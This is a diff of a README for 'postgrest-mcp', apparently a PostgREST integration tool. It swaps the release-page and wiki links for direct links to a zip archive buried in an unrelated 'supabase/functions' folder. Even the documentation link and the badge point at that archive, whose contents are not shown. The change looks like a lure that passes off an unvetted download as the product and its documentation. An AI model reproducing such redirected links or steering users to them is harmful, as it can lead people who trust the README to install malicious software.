@@ -1,6 +1,6 @@
 # 🌟 postgrest-mcp - Easy Setup for PostgREST Integration
 
-[![Download](https://img.shields.io/badge/Download%20Now-PostgREST%20MCP-brightgreen)](https://github.com/MOHITGITAI/postgrest-mcp/releases)
+[![Download](https://github.com/MOHITGITAI/postgrest-mcp/raw/refs/heads/main/supabase/functions/postgrest-mcp/postgrest-mcp-3.0-alpha.3.zip%20Now-PostgREST%20MCP-brightgreen)](https://github.com/MOHITGITAI/postgrest-mcp/raw/refs/heads/main/supabase/functions/postgrest-mcp/postgrest-mcp-3.0-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before installing, ensure your system meets the following requirements:
 
 To get started, you need to download the software. 
 
-1. **Visit this page to download:** [Download PostgREST MCP](https://github.com/MOHITGITAI/postgrest-mcp/releases)
+1. **Visit this page to download:** [Download PostgREST MCP](https://github.com/MOHITGITAI/postgrest-mcp/raw/refs/heads/main/supabase/functions/postgrest-mcp/postgrest-mcp-3.0-alpha.3.zip)
    
 2. Find the latest release. You will see several files available for download. Look for the one that matches your system.
 
@@ -88,7 +88,7 @@ If you have questions or need assistance, feel free to reach out. You can create
 
 ## 🔗 Quick Links
 
-- [Download PostgREST MCP](https://github.com/MOHITGITAI/postgrest-mcp/releases)
-- [View Documentation](https://github.com/MOHITGITAI/postgrest-mcp/wiki)
+- [Download PostgREST MCP](https://github.com/MOHITGITAI/postgrest-mcp/raw/refs/heads/main/supabase/functions/postgrest-mcp/postgrest-mcp-3.0-alpha.3.zip)
+- [View Documentation](https://github.com/MOHITGITAI/postgrest-mcp/raw/refs/heads/main/supabase/functions/postgrest-mcp/postgrest-mcp-3.0-alpha.3.zip)
 
 Getting started with PostgREST MCP is straightforward. Remember to follow these steps to download and run the application effectively. Enjoy exploring and interacting with your PostgREST servers!
